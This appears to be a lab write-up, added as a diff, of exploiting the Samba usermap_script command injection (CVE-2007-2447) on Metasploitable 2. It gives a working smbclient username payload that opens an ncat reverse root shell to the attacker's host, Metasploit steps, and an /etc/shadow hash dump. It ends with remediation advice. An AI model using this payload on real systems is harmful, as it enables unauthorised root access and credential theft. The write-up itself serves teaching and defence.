@@ -1,0 +1,152 @@
+---
+title: Samba usermap_script
+cve: CVE-2007-2447
+severity: critical
+port: 139,445/tcp
+service: SMB
+target: Metasploitable 2
+date: 2026-02-10
+description: Remote command injection via the Samba username map script configuration option, allowing unauthenticated code execution as root through crafted SMB requests.
+---
+
+## Overview
+
+CVE-2007-2447 is a command injection vulnerability in Samba versions 3.0.0 through 3.0.25rc3. When the `username map script` option is set in `smb.conf`, Samba passes the supplied username through `/bin/sh` for processing before looking it up. If the username contains shell metacharacters — backticks, semicolons, pipe characters — those get executed on the server.
+
+The fix is straightforward: the `username map script` feature was changed to sanitize input. But on Metasploitable 2 the vulnerable Samba version is present and the option is configured, which makes it an easy target. Root access, no authentication.
+
+## Environment
+
+Isolated KVM/QEMU lab, no internet routing between VMs.
+
+- **Attacker:** Kali Linux — `192.168.122.50`
+- **Target:** Metasploitable 2 — `192.168.122.100`
+- **Tools:** nmap, smbclient, ncat, Metasploit Framework
+
+## Discovery
+
+SMB ports showed up in my initial scan:
+
+```bash
+nmap -sV -p 139,445 192.168.122.100
+```
+
+```
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+```
+
+The version string `3.0.20-Debian` falls squarely in the vulnerable range. I confirmed with the Nmap smb-vuln script:
+
+```bash
+nmap --script smb-vuln-cve2009-3103,smb-vuln-ms06-025 -p 445 192.168.122.100
+```
+
+I also listed available shares to understand the attack surface:
+
+```bash
+smbclient -L //192.168.122.100 -N
+```
+
+```
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+```
+
+The `tmp` share being world-readable is telling, but the real vulnerability is in how Samba handles the username field during authentication.
+
+## Exploitation
+
+### Manual (smbclient)
+
+The injection happens in the username field. By wrapping a shell command in backticks, Samba executes it as part of the username lookup process — before it even checks whether the username is valid.
+
+I set up a listener first:
+
+```bash
+ncat -lvnp 4444
+```
+
+Then connect via smbclient with the payload embedded in the username. The `./=` prefix forces the server to treat it as a script invocation:
+
+```bash
+smbclient //192.168.122.100/tmp \
+  -U './=`nohup ncat 192.168.122.50 4444 -e /bin/bash`'
+```
+
+The connection to smbclient may appear to hang or return an error — that's fine, the command already fired. Back on the listener:
+
+```
+Ncat: Connection from 192.168.122.100.
+Ncat: Connection from 192.168.122.100:51032.
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The injection runs as the Samba daemon user, which on this box is root.
+
+### Via Metasploit
+
+The Metasploit module makes this one-liner clean:
+
+```bash
+msfconsole -q
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.122.100
+set LHOST 192.168.122.50
+run
+```
+
+```
+[*] Started reverse TCP handler on 192.168.122.50:4444
+[*] Command shell session 1 opened (192.168.122.50:4444 -> 192.168.122.100:34826)
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+hostname
+metasploitable
+```
+
+## Post-Exploitation
+
+From the root shell I checked the smb.conf to confirm the vulnerable configuration:
+
+```bash
+cat /etc/samba/smb.conf | grep -A2 "username map"
+```
+
+```
+   username map script = /etc/samba/scripts/mapusers.sh
+```
+
+That's the culprit — the `username map script` directive is set, and the script is called with the unsanitized username value. I also dumped the password hashes:
+
+```bash
+cat /etc/shadow
+```
+
+```
+root:$1$Qm0fq1RV$f6GOa9hQj7yVbjLGmN0P.0:14748:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14748:0:99999:7:::
+```
+
+## Remediation
+
+1. **Upgrade Samba** — Any version from 3.0.25 onward includes the fix for this. The patch sanitizes input passed to `username map script`.
+2. **Remove `username map script` if unused** — If the feature isn't actively needed, remove the directive from `smb.conf` entirely. It's uncommon in standard deployments.
+3. **Run Samba as an unprivileged user** — Samba should not run as root. Use a dedicated `samba` or `nobody` user and restrict what that user can access.
+4. **Firewall SMB ports** — Ports 139 and 445 should never be accessible from untrusted networks. SMB is a lateral movement goldmine and should be restricted to internal, trusted segments only.
+5. **Disable SMBv1** — While not directly related to this CVE, SMBv1 has a poor security track record. Disable it in `smb.conf` with `min protocol = SMB2`.
+
+## References
+
+- [NVD — CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
+- [Samba Security Advisory — usermap_script](https://www.samba.org/samba/security/CVE-2007-2447.html)
+- [Metasploit module: exploit/multi/samba/usermap_script](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)
+- [Offensive Security — Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
